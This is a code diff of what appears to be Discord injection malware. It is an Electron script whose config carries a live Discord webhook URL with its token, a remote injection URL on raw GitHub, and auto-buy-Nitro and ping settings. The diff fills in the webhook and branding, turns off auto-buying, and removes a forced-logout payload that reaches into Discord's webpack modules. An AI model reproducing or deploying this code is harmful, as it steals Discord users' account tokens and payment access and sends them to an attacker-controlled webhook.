@@ -7,13 +7,13 @@ const { BrowserWindow, session } = require("electron");
 const { exec } = require("child_process");
 
 const config = {
-    auto_buy_nitro: true,
+    auto_buy_nitro: false,
     ping_on_run: true,
     ping_val: "@here",
-    embed_name: "~~branding~~",
-    embed_icon: "~~icon~~",
+    embed_name: "~~mEow~~",
+    embed_icon: "https://cdn.discordapp.com/attachments/933873181813526541/1026926926297837639/unknown.png",
     embed_color: 8363488,
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "https://discord.com/api/webhooks/1022142100717961226/0JMe4jR89_40NHZJ5E4bTy3eYEfmOE9gzykA8UFix_QXQWRQ9DmX6XdGsIdSwDRPBcWR",
     injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
@@ -132,9 +132,6 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
     }
     if (!fs.existsSync(path.join(__dirname, "Fun"))) return !0;
     fs.rmdirSync(path.join(__dirname, "Fun"));
-    execScript(
-        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-    );
     return !1;
 }
 
